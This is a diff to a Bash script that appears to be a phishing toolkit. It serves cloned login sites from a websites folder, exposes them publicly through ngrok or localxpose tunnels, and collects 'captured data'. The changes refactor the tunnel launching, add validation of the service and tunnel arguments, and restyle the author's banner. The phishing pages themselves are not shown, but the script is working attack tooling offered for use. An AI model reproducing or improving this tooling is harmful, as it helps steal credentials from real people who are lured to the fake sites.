@@ -63,25 +63,27 @@
 # Versão 1.0: Nova opção '--add-token' adicionada para vincular contas através do token de acesso.
 #
 
+
+### trap
+
 trap interruptTwo SIGINT SIGTSTP
 
 
 ### VARIÁVEIS ###
+
+### Localhost e port
 
 host="localhost"
 port="5555"
 
 args=$@
 
+### Chaves de ativação de funcionalidade
+
 tokenAccessKey=0
 serviceKey=0
 listenKey=0
 tunnelKey=0
-
-tunnelsLinks=(
-    "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz"
-    "https://api.localxpose.io/api/v2/downloads/loclx-linux-${arch}.zip"
-)
 
 
 ### FUNÇÔES ###
@@ -133,7 +135,6 @@ checkTunnel() {
 }
 
 
-
 ### Interrompe processos e apaga arquivos
 
 interrupt() {
@@ -172,7 +173,6 @@ copyFiles() {
 	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mThis service is not available\e[0m"
     fi
 }
-
 
 
 ### Mata todos os processos
@@ -246,7 +246,6 @@ installTunnel() {
 }
 
 
-
 ### Ativa servidor localmente
 
 listenServer() {
@@ -293,23 +292,24 @@ addTokenAccess() {
 	echo -e "\e[0m2 Access your account at : \e[32;1mhttps://dashboard.ngrok.com/login\e[0m"
 	echo -e "\e[0m3 Copy the access token : \e[32;1mhttps://dashboard.ngrok.com/get-started/your-authtoken\e[0m"
 	echo -e "\nToken Access" ; read token
-
+	
 	[ -z "$token" ] && addTokenAccess
-	./tunnels/ngrok config add-authtoken $token
+	[ -n "$token" ] && ./tunnels/ngrok config add-authtoken $token
 	exit
 
     elif [ "$tokenName" == "loclx" ] ; then
 	echo -e "\e[0m1 register at : \e[32;1mhttps://localxpose.io/signup\e[0m"
 	echo -e "\e[0m2 Access your account at : \e[32;1mhttps://localxpose.io/login\e[0m"
 	echo -e "\e[0m3 Copy the access token : \e[32;1mhttps://localxpose.io/dashboard/access\e[0m"
+
 	./tunnels/loclx account login
-	exit
     fi
 }
 
+
 ### tunnels
 
-tunnel() {
+listen() {
     case "$tunnelSelected" in
 	"ngrok")
 	    groupFunction
@@ -333,7 +333,7 @@ tunnel() {
 	    groupFunction
 	    installTunnel "loclx" "1"
 	    listenServer
-	    ./tunnels/loclx tunnel --raw-mode http --https-redirect &> wait.log &
+	    ./tunnels/loclx tunnel --raw-mode http --https-redirect --to ${host}:${port} &> wait.log &
 	    waitMessage 10
 	    showLink "loclx"
 	    ;;
@@ -372,7 +372,7 @@ showLink() {
 	fi
 
     elif [ "$tunnel" == "ngrok" ] ; then
-	link="$(grep -o 'https://.[-0-9a-z]*.ngrok.io' wait.log)"
+	link="$(grep -o 'https://[-0-9a-z.]*' wait.log)"
 
 	if [ -n "$link" ] ; then
 	
@@ -466,10 +466,14 @@ getDataCaptured() {
 ### Banner
 
 banner() {
-echo -e "\e[34m
+	local w="\e[0m"    # Color white
+	local b="\e[34;1m" # Color blue
+	local f="\e[34;3m" # Color blue font italic
+
+	echo -e "${b}
 	        '  
-              '   '  TIOOLIVER | t.me/tiooliver_sh
-            '       '   youtube.com/@tioolive - BRAZIL
+              '   '  TIOOLIVER | ${f}t.me/tiooliver_sh
+            '       '   ${f}youtube.com/@tioolive ${w}${b}- BRAZIL
         . ' .    '    '                       '
      ' 		    '	                   '   '
   █▀▄ ▄▀█ ▀█▀ ▄▀█   █▀ █▀█ █▀▀ █ ▄▀█ █░░
@@ -479,8 +483,8 @@ echo -e "\e[34m
           ' .  .  .  .  . '.    .'         '  '
 	     '         '    '. '              .
 	       '       '      '
-	         ' .  '   Site: http://tiooliver.rf.gd 
-\e[0m"
+	         ' .  '   Site: ${f}http://tiooliver.rf.gd 
+${w}"
 }
 
 
@@ -731,13 +735,13 @@ menu() {
 		       [[ -z "$tunnelSelected" ]] then
 			echo -e "\n\e[0mRunning the setup locally\e[0m..."
 			args="--listenServer --service $serviceSelected"
-			tunnel && getDataCaptured
+			listen && getDataCaptured
 
 		    elif [[ -n "$serviceSelected" ]] && 
 			[[ -n "$tunnelSelected" ]] ; then
 			echo -e "\n\e[0mRunning the configuration with tunnel\e[0m..."
 			args="--listenServer --service $serviceSelected --tunnel $tunnelSelected"
-			tunnel && getDataCaptured
+			listen && getDataCaptured
 
 		    else
 			echo -e "\n\e[0m\e[33;1m[!] No settings defined\e[0m"
@@ -846,6 +850,11 @@ while [ -n "$1" ] ; do
 		exit 1
 	    fi
 
+	    if [ ! -d  ./websites/$1 ] ; then
+		echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mInvalid service $1\e[0m"
+		exit
+	    fi
+
 	    serviceKey=1
 	    serviceSelected="$1";;
 
@@ -860,8 +869,14 @@ while [ -n "$1" ] ; do
 		exit 1
 	    fi
 
+	    if [ ! -f  ./tunnels/$1 ] ; then
+		echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mInvalid tunnel $1\e[0m"
+		exit
+	    fi
+	    
 	    tunnelKey=1
 	    tunnelSelected="$1"
+	
 	    ;;
 	
         -i | --interactive)
@@ -881,10 +896,10 @@ if [ "$tokenAccessKey" == 1 ] ; then
     checkReq && checkProot && addTokenAccess
     
 elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 0 ] ; then
-    checkReq && checkProot && tunnel && getDataCaptured
+    checkReq && checkProot && listen && getDataCaptured
 
 elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 1 ] ; then
-    checkReq && checkProot && tunnel && getDataCaptured
+    checkReq && checkProot && listen && getDataCaptured
 
 else
     echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mError processing command, try: -h,--help for more details\e[0m"
